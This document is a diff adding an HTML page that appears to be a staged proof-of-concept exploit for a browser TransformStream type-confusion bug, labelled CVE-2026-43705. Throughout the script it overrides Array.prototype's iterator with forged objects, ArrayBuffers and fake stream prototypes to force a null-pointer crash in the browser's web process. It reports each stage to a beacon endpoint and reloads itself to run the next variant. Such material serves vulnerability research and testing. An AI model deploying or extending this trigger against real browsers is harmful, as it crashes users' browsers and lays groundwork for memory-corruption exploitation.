@@ -1,0 +1,287 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1196 TransformStream Type Confusion (CVE-2026-43705)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1196 — CVE-2026-43705 TransformStream TC</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1196-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* P1196: CVE-2026-43705 TransformStream type confusion
+   Root cause: createInternalTransformStream calls JS which returns a 3-element
+   result read via Array.prototype[Symbol.iterator]. Script can override the
+   iterator. In release builds ASSERT(results.size()==3) is compiled out.
+   dynamicDowncast<JSReadableStream/JSWritableStream> returns nullptr for
+   wrong-type objects, and ->wrapped() dereferences without null check.
+
+   If PATCHED: TypeError thrown and caught
+   If VULNERABLE: WebProcess crash (null deref) = page dies = no RESULT beacon
+
+   Strategy: stage machine with localStorage persistence. Each stage tries
+   a different poisoned iterator variant. A crash between ATTEMPT and RESULT
+   beacons proves the code path is reached and unpatched. */
+
+(function run(){
+var STAGES=[
+  'detect',           /* feature-detect TransformStream */
+  'baseline',         /* normal TransformStream works? */
+  'plainObj',         /* iterator returns plain objects */
+  'truncated',        /* iterator returns <3 elements */
+  'extraElems',       /* iterator returns >3 elements */
+  'abRef',            /* iterator returns ArrayBuffer refs */
+  'streamLike'        /* iterator returns stream-shaped objects */
+];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1196_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1196_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+(STAGES.length-1)+' — '+(STAGES[stage]||'done'));
+setCounters('stages done: '+stage+'/'+STAGES.length);
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  var summary=JSON.stringify(results).slice(0,800);
+  B('ALL-DONE',summary);
+  log('=== ALL STAGES COMPLETE ===','ok');
+  addFind(summary);
+  try{localStorage.removeItem('p1196_stage');localStorage.removeItem('p1196_res');}catch(e){}
+  return;
+}
+try{localStorage.setItem('p1196_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function done(rep){
+  results.push({s:stage,n:cur,r:rep});
+  try{localStorage.setItem('p1196_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','['+cur+']'+rep.slice(0,600));
+  addFind(cur+': '+rep.slice(0,300));
+  setStatus(rep.slice(0,80));
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT','stage='+(stage+1));
+  setTimeout(function(){location.reload(true);},600);
+}
+
+/* Save original iterator so we can restore it */
+var origIter=Array.prototype[Symbol.iterator];
+
+function restoreIter(){
+  try{Array.prototype[Symbol.iterator]=origIter;}catch(e){}
+}
+
+function poisonIter(fn){
+  Array.prototype[Symbol.iterator]=fn;
+}
+
+/* ---- STAGE: detect ---- */
+if(cur==='detect'){
+  setPhase('Feature-detect TransformStream');
+  var info=[];
+  info.push('TS='+(typeof TransformStream));
+  info.push('RS='+(typeof ReadableStream));
+  info.push('WS='+(typeof WritableStream));
+  try{
+    info.push('Symbol.iterator='+(typeof Symbol.iterator));
+    info.push('Array.proto[SI]='+(typeof Array.prototype[Symbol.iterator]));
+  }catch(e){info.push('SI-err:'+e.message);}
+  done(info.join('|'));
+
+/* ---- STAGE: baseline ---- */
+}else if(cur==='baseline'){
+  setPhase('Normal TransformStream construction');
+  var rep;
+  try{
+    var ts=new TransformStream();
+    var rd=ts.readable;
+    var wr=ts.writable;
+    rep='OK|readable='+(rd?rd.constructor.name:'null')+'|writable='+(wr?wr.constructor.name:'null');
+  }catch(e){
+    rep='THROW:'+e.constructor.name+':'+String(e.message).slice(0,60);
+  }
+  done(rep);
+
+/* ---- STAGE: plainObj (CVE trigger variant 1) ---- */
+}else if(cur==='plainObj'){
+  setPhase('Poisoned iterator: plain objects');
+  B('ATTEMPT','plainObj-about-to-fire');
+  var rep2;
+  try{
+    poisonIter(function(){
+      var i=0;
+      var fakes=[{},{},{}];
+      return {next:function(){
+        if(i<fakes.length) return {value:fakes[i++],done:false};
+        return {value:undefined,done:true};
+      }};
+    });
+    var ts2=new TransformStream();
+    restoreIter();
+    rep2='NO-CRASH|ts='+typeof ts2;
+    if(ts2){
+      try{rep2+='|rd='+(ts2.readable?ts2.readable.constructor.name:'null');}catch(e2){rep2+='|rd-err';}
+      try{rep2+='|wr='+(ts2.writable?ts2.writable.constructor.name:'null');}catch(e3){rep2+='|wr-err';}
+    }
+  }catch(e){
+    restoreIter();
+    rep2='THROW:'+e.constructor.name+':'+String(e.message).slice(0,80);
+  }
+  done(rep2);
+
+/* ---- STAGE: truncated (iterator returns <3 elems) ---- */
+}else if(cur==='truncated'){
+  setPhase('Poisoned iterator: truncated (1 elem)');
+  B('ATTEMPT','truncated-about-to-fire');
+  var rep3;
+  try{
+    poisonIter(function(){
+      var i=0;
+      return {next:function(){
+        if(i<1){i++;return {value:{},done:false};}
+        return {value:undefined,done:true};
+      }};
+    });
+    var ts3=new TransformStream();
+    restoreIter();
+    rep3='NO-CRASH|ts='+typeof ts3;
+  }catch(e){
+    restoreIter();
+    rep3='THROW:'+e.constructor.name+':'+String(e.message).slice(0,80);
+  }
+  done(rep3);
+
+/* ---- STAGE: extraElems (iterator returns >3 elems) ---- */
+}else if(cur==='extraElems'){
+  setPhase('Poisoned iterator: 6 elements');
+  B('ATTEMPT','extraElems-about-to-fire');
+  var rep4;
+  try{
+    poisonIter(function(){
+      var i=0;
+      var items=[{},{},{},{},{},{}];
+      return {next:function(){
+        if(i<items.length) return {value:items[i++],done:false};
+        return {value:undefined,done:true};
+      }};
+    });
+    var ts4=new TransformStream();
+    restoreIter();
+    rep4='NO-CRASH|ts='+typeof ts4;
+  }catch(e){
+    restoreIter();
+    rep4='THROW:'+e.constructor.name+':'+String(e.message).slice(0,80);
+  }
+  done(rep4);
+
+/* ---- STAGE: abRef (ArrayBuffer in iterator slots) ---- */
+}else if(cur==='abRef'){
+  setPhase('Poisoned iterator: ArrayBuffer refs');
+  B('ATTEMPT','abRef-about-to-fire');
+  var rep5;
+  try{
+    var ab1=new ArrayBuffer(4096);
+    var ab2=new ArrayBuffer(4096);
+    var ab3=new ArrayBuffer(4096);
+    poisonIter(function(){
+      var i=0;
+      var items=[ab1,ab2,ab3];
+      return {next:function(){
+        if(i<items.length) return {value:items[i++],done:false};
+        return {value:undefined,done:true};
+      }};
+    });
+    var ts5=new TransformStream();
+    restoreIter();
+    rep5='NO-CRASH|ts='+typeof ts5;
+    /* Check if our ArrayBuffers were affected */
+    rep5+='|ab1len='+ab1.byteLength+'|ab2len='+ab2.byteLength;
+  }catch(e){
+    restoreIter();
+    rep5='THROW:'+e.constructor.name+':'+String(e.message).slice(0,80);
+  }
+  done(rep5);
+
+/* ---- STAGE: streamLike (objects mimicking stream interface) ---- */
+}else if(cur==='streamLike'){
+  setPhase('Poisoned iterator: stream-like objects');
+  B('ATTEMPT','streamLike-about-to-fire');
+  var rep6;
+  try{
+    /* Create objects that look like ReadableStream/WritableStream */
+    var fakeReadable=Object.create(ReadableStream.prototype);
+    var fakeWritable=Object.create(WritableStream.prototype);
+    var fakeController={};
+    poisonIter(function(){
+      var i=0;
+      var items=[fakeReadable,fakeWritable,fakeController];
+      return {next:function(){
+        if(i<items.length) return {value:items[i++],done:false};
+        return {value:undefined,done:true};
+      }};
+    });
+    var ts6=new TransformStream();
+    restoreIter();
+    rep6='NO-CRASH|ts='+typeof ts6;
+    if(ts6){
+      try{rep6+='|rd='+(ts6.readable===fakeReadable?'SAME':'diff');}catch(e2){}
+      try{rep6+='|wr='+(ts6.writable===fakeWritable?'SAME':'diff');}catch(e3){}
+    }
+  }catch(e){
+    restoreIter();
+    rep6='THROW:'+e.constructor.name+':'+String(e.message).slice(0,80);
+  }
+  done(rep6);
+}
+
+})(); /* end IIFE */
+
+/* Reload poller */
+(function(){
+  var cur='P1196-transformstream-tc';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
